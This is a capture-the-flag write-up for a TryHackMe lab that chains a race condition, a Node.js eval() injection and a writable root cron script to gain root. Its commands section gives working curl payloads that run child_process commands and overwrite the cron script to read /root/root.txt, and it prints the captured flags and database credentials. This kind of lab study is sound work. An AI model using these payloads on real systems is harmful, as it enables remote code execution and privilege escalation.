# Security Assessment Report: Racetrack Bank

## Room info
- **Platform:** TryHackMe
- **Target:** `10.128.188.82`
- **Room type:** Challenge / Web Exploitation + Privilege Escalation
- **Date solved:** 2026-04-30
- **Objectives:** Capture the user flag and root flag

## Objective status
- User flag (`THM{178c31090a7e0f69560730ad21d90e70}`): CAPTURED
- Root flag (`THM{55a9d6099933f6c456ccb2711b8766e3}`): CAPTURED

## Exploitation chain

1. **Reconnaissance** — Nmap scan reveals nginx 1.18.0 proxying a Node.js/Express app on port 80. Gobuster identifies key endpoints: `/create.html`, `/login.html`, `/purchase.html`, `/api/create`, `/api/login`, `/api/givegold`.

2. **Race condition to multiply gold** — The `/api/givegold` endpoint lacks atomicity and locking. By firing hundreds of concurrent `givegold` requests, the same gold balance is transferred multiple times before the database updates, exponentially multiplying wealth.

3. **Buy premium access** — With 10,000+ gold, the premium account unlocks a "calculator" feature at `/premiumfeatures.html`.

4. **Node.js `eval()` injection → RCE** — The calculator endpoint (`/api/calculate`) passes the `calculation` parameter directly into `eval()` without sanitization. This grants Remote Code Execution as user `brian`.

5. **Privilege escalation via world-writable cron directory** — A cron job running as root executes `/home/brian/cleanup/cleanupscript.sh`. The directory is owned by `brian`, so we replace the script with a payload that copies `/root/root.txt` to a world-readable location. On the next cron tick, the root flag is captured.

## Key findings

- **Services:** nginx 1.18.0 (Ubuntu), Node.js/Express web app, PostgreSQL, OpenSSH 8.2p1
- **Interesting paths:** `/api/givegold`, `/api/calculate`, `/api/buypremium`, `/api/create`, `/api/login`
- **Credentials exposed:** `DATABASE_URL=postgres://brian:superstrongpass@localhost:5432/racetrackbank` (in `.env`)
- **Users enumerated:** `brian` (app user), `ubuntu`, `postgres`
- **SUID binaries:** `/home/brian/admin/manageaccounts` (root SUID, setgid)
- **Scheduler:** cron running as root executes `/home/brian/cleanup/cleanupscript.sh`

## Vulnerability analysis

| Vulnerability name | Issue description | Impact | How it was solved (remediation) | What I learned |
|---|---|---|---|---|
| Race condition in gold transfer (CWE-362) | `/api/givegold` lacks database-level locking or atomic increments. Concurrent requests read the same balance before any subtraction completes, allowing the same gold to be sent multiple times. | Complete bypass of the in-app economy; unlimited gold allows purchase of premium features. | Use PostgreSQL atomic operations (`UPDATE ... SET gold = gold - $1 WHERE gold >= $1`), row-level locking (`SELECT ... FOR UPDATE`), or a transactional queue. | Race conditions aren't just for file systems — any shared state (DB rows, in-memory counters) is vulnerable. Always assume concurrent access and use atomic operations. |
| Code injection via `eval()` (CWE-94) | The `/api/calculate` endpoint passes user-controlled input directly to Node.js `eval()`. No sandboxing, whitelist, or sanitization is applied. | Full Remote Code Execution on the server as user `brian`. | Never pass user input to `eval()`, `new Function()`, or similar dynamic execution. Use a proper math expression parser (e.g., `mathjs` with limited scope). | `eval()` is not just dangerous in the browser — on the server it means instant RCE. Any dynamic evaluation of user input (even in "harmless" features like calculators) must be sandboxed. |
| Insecure file permissions for cron script (CWE-276 / CWE-732) | Directory `/home/brian/cleanup/` is owned by `brian` but contains a script executed by a root cron job. The file inside is owned by root, but brian can delete and replace it because he owns the directory. | Privilege escalation to root. | The cron script should reside in a root-owned directory (e.g., `/usr/local/bin/`) with `root:root` ownership and `0755` permissions. The executable directory should not be writable by non-root users. | Directory ownership matters more than file ownership. If the directory is writable, the owner can delete/replace any file inside regardless of who owns the file. |

### References

**Race condition (CWE-362):**
- [OSV: CVE-2025-46328 — TOCTOU in snowflake-connector-nodejs](https://osv.dev/vulnerability/CVE-2025-46328)
- [OSV: CVE-2017-18869 — TOCTOU in npm chownr](https://osv.dev/vulnerability/CVE-2017-18869)
- [NVD: CWE-362 Race Condition](https://nvd.nist.gov/vuln/detail/CWE-362)
- [CISA KEV Catalog (search: race condition)](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)

**Code injection (CWE-94):**
- [OSV: GHSA-87r5-mp6g-5w5j — CVE-2026-1615 jsonpath RCE](https://osv.dev/vulnerability/GHSA-87r5-mp6g-5w5j)
- [OSV: GHSA-jc85-fpwf-qm7x — CVE-2025-12735 expr-eval RCE](https://osv.dev/vulnerability/GHSA-jc85-fpwf-qm7x)
- [OSV: GHSA-x9hc-rw35-f44h — static-eval sandbox breakout](https://osv.dev/vulnerability/GHSA-x9hc-rw35-f44h)
- [GitHub Advisory Database: Code Injection](https://github.com/advisories?query=code+injection)
- [NVD: CWE-94 Code Injection](https://nvd.nist.gov/vuln/detail/CWE-94)

**Insecure permissions (CWE-276 / CWE-732):**
- [NVD: CWE-276 Incorrect Default Permissions](https://nvd.nist.gov/vuln/detail/CWE-276)
- [NVD: CWE-732 Incorrect Permission Assignment](https://nvd.nist.gov/vuln/detail/CWE-732)

## Commands worth keeping

```bash
# === RECON ===
nmap -sC -sV -p- --min-rate 10000 --max-retries 1 --host-timeout 5m 10.128.188.82
gobuster dir -u http://10.128.188.82 -w /usr/share/wordlists/dirb/common.txt -t 50 -x js,json,html

# === RACE CONDITION GOLD MULTIPLY ===
python3 /tmp/race_final.py

# === RCE VIA CALCULATOR EVAL ===
# Basic test
curl -s -b cookies.txt -X POST http://10.128.188.82/api/calculate -d "calculation=1+1"
# RCE as brian
curl -s -b cookies.txt -X POST http://10.128.188.82/api/calculate \
  -d "calculation=require('child_process').execSync('id').toString()"

# === PRIVESC: REPLACE CRON SCRIPT ===
# Replace the cleanup script that runs as root
curl -s -b cookies.txt -X POST http://10.128.188.82/api/calculate \
  -d "calculation=require('fs').writeFileSync('/home/brian/cleanup/cleanupscript.sh','#!/bin/bash\ncat /root/root.txt > /home/brian/cleanup/flag.txt\nchmod 644 /home/brian/cleanup/flag.txt\n');require('child_process').execSync('chmod 755 /home/brian/cleanup/cleanupscript.sh').toString()"

# === READ FLAG AFTER CRON FIRES ===
curl -s -b cookies.txt -X POST http://10.128.188.82/api/calculate \
  -d "calculation=require('child_process').execSync('cat /home/brian/cleanup/flag.txt').toString()"
```

## Loot & flags

- **User flag:** `THM{178c31090a7e0f69560730ad21d90e70}`
- **Root flag:** `THM{55a9d6099933f6c456ccb2711b8766e3}`
- **Database credentials:** `brian:superstrongpass@localhost:5432/racetrackbank`
- **SUID root binary:** `/home/brian/admin/manageaccounts`

## Senior-level lessons learned

1. **Atomicity is non-negotiable for financial transactions.** The race condition in `givegold` is a textbook example of why database-level locking (`SELECT ... FOR UPDATE`) or atomic updates are required for any state that represents value. In real-world environments, this is why payment APIs are idempotent and use idempotency keys — without them, double-spends and balance manipulation are inevitable.

2. **`eval()` is a code execution backdoor, not a feature.** The calculator's `eval()` is the same pattern that fuels real-world CVEs like CVE-2025-12735 (expr-eval, CVSS 9.8) and CVE-2026-1615 (jsonpath, CVSS 9.8). Any library that evaluates user-supplied JavaScript expressions without sandboxing is a critical RCE vector. The fix is architectural: use a math-only parser or, at minimum, `vm2`-style sandboxing with no `require` access.

3. **Cron scripts must live in root-owned, non-writable directories.** This is a common privesc pattern across CTFs and real environments alike. If a cron job runs a script from a world-writable path (or a path where a non-root user controls the directory), any user can swap the script and escalate privileges. Audit cron jobs with `find /etc/cron* -type f -exec ls -la {} \;` and ensure scripts are not writable by non-root users.

### Detection & hardening notes

- **SIEM detection:** Monitor for rapid-fire POST requests to the same endpoint from a single session (race condition indicator). Flag `eval()`, `.execSync()`, and `new Function()` usage in Node.js application logs.
- **CIS guidance:** Apply CIS Benchmark for Node.js — restrict `eval()` usage via ESLint `no-eval` rule in CI/CD. Use `fs.permissions` to validate cron script ownership.
- **NIST 800-53:** Address race conditions under AC-3 (Access Enforcement) and SC-7 (Boundary Protection). Code injection maps to SI-10 (Information Input Validation).

## Analysis notes

- **Real-world equivalents:** The race condition mirrors real double-spend vulnerabilities in fintech APIs (e.g., Stripe's idempotency key requirement). The `eval()` injection matches the 2023-2025 wave of npm package supply-chain RCEs (jsonpath, expr-eval, static-eval). The cron privesc is identical to techniques used by post-exploitation frameworks (GTFOBins, LinPEAS).
- **Possible detection:** WAF rules blocking `execSync`, `child_process`, and `eval` in POST bodies. Filesystem monitoring (auditd) for deletions/replacements in cron directories.
- **Hardening:** Read-only root filesystem for cron jobs. SELinux/AppArmor profiles for the Node.js application. PostgreSQL row-level security for financial transactions.
